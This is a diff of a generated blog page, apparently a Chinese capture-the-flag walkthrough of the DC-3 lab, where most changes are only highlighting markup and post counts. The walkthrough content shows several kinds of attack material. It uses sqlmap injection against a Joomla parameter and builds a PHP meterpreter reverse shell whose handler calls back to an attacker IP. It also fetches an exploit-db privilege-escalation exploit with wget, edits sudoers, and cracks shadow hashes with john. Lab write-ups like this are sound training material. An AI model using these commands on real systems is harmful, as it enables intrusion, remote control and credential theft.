@@ -318,7 +318,7 @@
       
     
 
-    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档<span class="badge">17</span></a>
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档<span class="badge">18</span></a>
 
   </li>
 
@@ -553,7 +553,7 @@
 
 <img src="//songxpu.github.io/2019/08/16/DC-3/4.png" width height>
 
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>#########################################payload########################################</span><br><span class="line">sqlmap -u "http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#########################################payload########################################</span></span></span><br><span class="line">sqlmap -u "http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br></pre></td></tr></table></figure>
 
 <img src="//songxpu.github.io/2019/08/16/DC-3/sqlmap_1.png" width="700" height>
 
@@ -582,7 +582,7 @@
 
 <img src="//songxpu.github.io/2019/08/16/DC-3/7.png" width="750">
 
-<h3 id="sf反弹shell"><a href="#sf反弹shell" class="headerlink" title="sf反弹shell"></a>sf反弹shell</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.64.131 LPORT=4444 -f raw &gt; shell.php</span><br><span class="line"><span class="meta">#</span>########################################################################################</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set PAYLOAD php/meterpreter_reverse_tcp</span><br><span class="line">set LHOST 192.168.88.128</span><br><span class="line">set LPORT 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<h3 id="sf反弹shell"><a href="#sf反弹shell" class="headerlink" title="sf反弹shell"></a>sf反弹shell</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.64.131 LPORT=4444 -f raw &gt; shell.php</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">########################################################################################</span></span></span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set PAYLOAD php/meterpreter_reverse_tcp</span><br><span class="line">set LHOST 192.168.88.128</span><br><span class="line">set LPORT 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 
 <h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p><strong>查看系统信息</strong>：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/version</span><br><span class="line">uname -a</span><br><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure>
@@ -595,7 +595,7 @@
 </blockquote>
 <img src="//songxpu.github.io/2019/08/16/DC-3/9.png" width="800">
 
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>将exp移动至/var/www/html/</span><br><span class="line">cp /usr/share/exploitdb/exploits/linux/local/39772.txt /var/www/html/39772.txt</span><br><span class="line"><span class="meta">#</span>kali开启Apache</span><br><span class="line">/etc/init.d/apache2 start</span><br><span class="line"><span class="meta">#</span>下载至本机</span><br><span class="line">wget http://192.168.64.131/39772.txt</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">将exp移动至/var/www/html/</span></span><br><span class="line">cp /usr/share/exploitdb/exploits/linux/local/39772.txt /var/www/html/39772.txt</span><br><span class="line"><span class="meta">#</span><span class="bash">kali开启Apache</span></span><br><span class="line">/etc/init.d/apache2 start</span><br><span class="line"><span class="meta">#</span><span class="bash">下载至本机</span></span><br><span class="line">wget http://192.168.64.131/39772.txt</span><br></pre></td></tr></table></figure>
 
 <p>根据txt文件中描述，获取到exp:</p>
 <img src="//songxpu.github.io/2019/08/16/DC-3/exp.png" width="700">
@@ -621,12 +621,12 @@
 <li><p>用户加入sudo组：在/etc/sudoers文件里给该用户添加权限</p>
 </li>
 </ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>root权限设置</span><br><span class="line">chmod u+w /etc/sudoers</span><br><span class="line">vi /etc/sudoers </span><br><span class="line"><span class="meta">#</span>找到这行 root ALL=(ALL) ALL,在他下面添加xxx ALL=(ALL) ALL (这里的xxx是你的用户名)</span><br><span class="line">chmod u-w /etc/sudoers</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">root权限设置</span></span><br><span class="line">chmod u+w /etc/sudoers</span><br><span class="line">vi /etc/sudoers </span><br><span class="line"><span class="meta">#</span><span class="bash">找到这行 root ALL=(ALL) ALL,在他下面添加xxx ALL=(ALL) ALL (这里的xxx是你的用户名)</span></span><br><span class="line">chmod u-w /etc/sudoers</span><br></pre></td></tr></table></figure>
 
 <h3 id="John破解Linux密码教程"><a href="#John破解Linux密码教程" class="headerlink" title="John破解Linux密码教程"></a>John破解Linux密码教程</h3><ul>
 <li>破解Linux下passwd、shadow中的密码</li>
 </ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>合并passwd和shadow</span><br><span class="line">unshadow /etc/passwd /etc/shadow &gt; shadow</span><br><span class="line"><span class="meta">#</span>使用密码字典进行爆破</span><br><span class="line">john --wordlist=/usr/share/john/password.lst --rules shadow</span><br><span class="line"><span class="meta">#</span>不使用密码字典爆破</span><br><span class="line">john shadow</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">合并passwd和shadow</span></span><br><span class="line">unshadow /etc/passwd /etc/shadow &gt; shadow</span><br><span class="line"><span class="meta">#</span><span class="bash">使用密码字典进行爆破</span></span><br><span class="line">john --wordlist=/usr/share/john/password.lst --rules shadow</span><br><span class="line"><span class="meta">#</span><span class="bash">不使用密码字典爆破</span></span><br><span class="line">john shadow</span><br></pre></td></tr></table></figure>
 
 <img src="//songxpu.github.io/2019/08/16/DC-3/john.png" width="700">
 
@@ -761,7 +761,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">17</span>
+                    <span class="site-state-item-count">18</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
@@ -900,7 +900,7 @@
     
       <span class="post-meta-item-text">站点总字数：</span>
     
-    <span title="站点总字数">81k</span>
+    <span title="站点总字数">84k</span>
   
 
   
@@ -911,7 +911,7 @@
     
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
     
-    <span title="站点阅读时长">1:14</span>
+    <span title="站点阅读时长">1:16</span>
   
 </div>
 
